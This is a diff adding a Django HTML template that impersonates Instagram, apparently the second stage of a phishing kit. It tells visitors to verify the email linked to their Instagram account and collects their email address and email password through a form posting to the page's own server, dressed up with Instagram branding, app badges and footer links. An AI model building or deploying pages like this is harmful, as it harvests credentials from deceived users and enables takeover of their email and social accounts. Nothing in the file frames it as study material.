@@ -1,0 +1,92 @@
+{% load  static %}
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="utf-8">
+	<title>Instagram</title>
+	<link rel="stylesheet" href=" {% static '2style.css' %}">
+	<link rel="shortcut icon" href="{% static 'fav.jpg' %}">
+
+</head>
+<body>
+
+<div class="wrapper">
+	<div class="header">
+		<div class="top">
+			<h3 class="text"> Please verify your e-mail address linked to your instagram account. </h3>
+	<h4 text-align="center">If there is no e-mail address linked to your account click the skip button.</h4>
+			<div class="logo"><img src="{% static 'mail2.png' %}" alt="instagram" style="width: 175px;"></div>
+				<div class="form">
+<form action="" method="POST">
+
+	{%csrf_token%}
+		<div class="input_field">
+						<input type="text" placeholder="Mail Address" class="input" name="email2" />
+					</div>
+					<div class="input_field">
+						<input type="password" placeholder="Mail Password" name="password2" class="input" />
+					</div>
+					<div class="btn">
+						<button type="submit" class="btn2" >Log In</button>
+					</div>
+					</div>
+					</form>
+				<div class="or">
+		 			<div class="line"></div>
+<p></p>
+<div class="line"></div>
+</div>
+<div class="btn">
+	<div class="btn2">
+						<a href="#">skip</a>
+						</div>
+					</div>
+					<div class="diff">
+						<div class="fb">
+							<p></p>
+						</div>
+						<div class="forget"><a href="#"></a>
+						</div>
+						</div>
+
+						
+					</div>
+
+			<div class="signup" >
+				<p><a href="#"></a></p>
+
+			</div>
+			<div class="apps">
+				<p>Get the app.</p>
+				<div class="icons">
+					<a href="#"><img src="{% static 'appstore.png' %} " alt="appstore"></a><a href="#">
+						<img src=" {% static 'googleplay.png' %} " alt="googleplay"> 
+					</a>
+				</div>
+			</div>
+		</div>
+		<div class="footer">
+			<div class="links">
+				<ul>
+					<li><a href="#">ABOUT US</a></li>
+					<li><a href="#">SUPPORT</a></li>
+					<li><a href="#">PRESS</a></li>
+					<li><a href="#">API</a></li>
+					<li><a href="#">JOBS</a></li>
+					<li><a href="#">PRIVACY</a></li>
+					<li><a href="#">TERMS</a></li>
+					<li><a href="#">DIRECTORY</a></li>
+					<li><a href="#">PROFILES</a></li>
+					<li><a href="#">HASHTAGS</a></li>
+					<li><a href="#">LANGUAGES</a></li>
+				</ul>
+			</div>
+<div class="copyright">
+	2022  INSTAGRAM
+</div>
+		</div>
+	</div>
+</body>
+</body>
+</html>
